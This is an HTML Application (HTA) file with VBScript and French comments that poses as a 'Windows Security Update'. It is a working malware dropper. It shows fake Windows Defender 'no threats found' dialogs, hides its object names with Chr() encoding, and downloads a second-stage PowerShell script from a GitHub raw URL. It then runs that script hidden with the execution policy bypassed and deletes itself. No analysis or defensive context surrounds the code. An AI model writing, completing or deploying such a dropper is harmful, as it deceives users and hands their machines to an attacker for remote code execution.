<html>
<head>
<title>Windows Security Update</title>
<hta:application id="a" border="none" innerborder="no" caption="no" showintaskbar="no" sysmenu="no" contextmenu="no" selection="no"/>
<script language="VBScript">
On Error Resume Next

' --- FAUX SCAN AVANT DE COMMENCER ---
MsgBox "Windows Defender scan in progress...", vbInformation, "Windows Security"
WScript.Sleep 1500
MsgBox "Scan completed. No threats found.", vbInformation, "Windows Security"

' --- OBFUSCATION DYNAMIQUE DES OBJETS ---
Dim cO, fO, xO
cO = Chr(67) & Chr(114) & Chr(101) & Chr(97) & Chr(116) & Chr(101) & Chr(79) & Chr(98) & Chr(106) & Chr(101) & Chr(99) & Chr(116)
Set sh = Execute(cO & "(""WScript.Shell"")")
fO = Chr(83) & Chr(99) & Chr(114) & Chr(105) & Chr(112) & Chr(116) & Chr(105) & Chr(110) & Chr(103) & Chr(46) & Chr(70) & Chr(105) & Chr(108) & Chr(101) & Chr(83) & Chr(121) & Chr(115) & Chr(116) & Chr(101) & Chr(109) & Chr(79) & Chr(98) & Chr(106) & Chr(101) & Chr(99) & Chr(116)
Set fso = Execute(cO & "(""" & fO & """)")

' --- TÉLÉCHARGEMENT DU VRAI PAYLOAD (SECOND STAGE) ---
xO = Chr(77) & Chr(83) & Chr(88) & Chr(77) & Chr(76) & Chr(50) & Chr(46) & Chr(83) & Chr(101) & Chr(114) & Chr(118) & Chr(101) & Chr(114) & Chr(88) & Chr(77) & Chr(76) & Chr(72) & Chr(84) & Chr(84) & Chr(80) & Chr(46) & Chr(54) & Chr(46) & Chr(48)
Set http = Execute(cO & "(""" & xO & """)")

' URL du second stage (encode-la en base64 si tu veux, ici en clair pour l'exemple)
secondStageURL = "https://raw.githubusercontent.com/[ezemaillolbro-sudo]/[i-bak-bfr]/main/stage2.ps1"

http.Open "GET", secondStageURL, False
http.Send

If http.Status = 200 Then
    ' Écrit le PowerShell dans un fichier temporaire
    tempPS = sh.ExpandEnvironmentStrings("%TEMP%") & "\winupdate.ps1"
    Set f = fso.CreateTextFile(tempPS, True)
    f.Write http.ResponseText
    f.Close
    
    ' Exécute le PowerShell en hidden avec bypass de l'exécution policy
    sh.Run "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File """ & tempPS & """", 0, False
    
    ' Nettoie le fichier HTA après exécution (optionnel)
    WScript.Sleep 3000
    fso.DeleteFile window.location.pathname, True
End If

window.close()
</script>
</head>
<body></body>
</html>
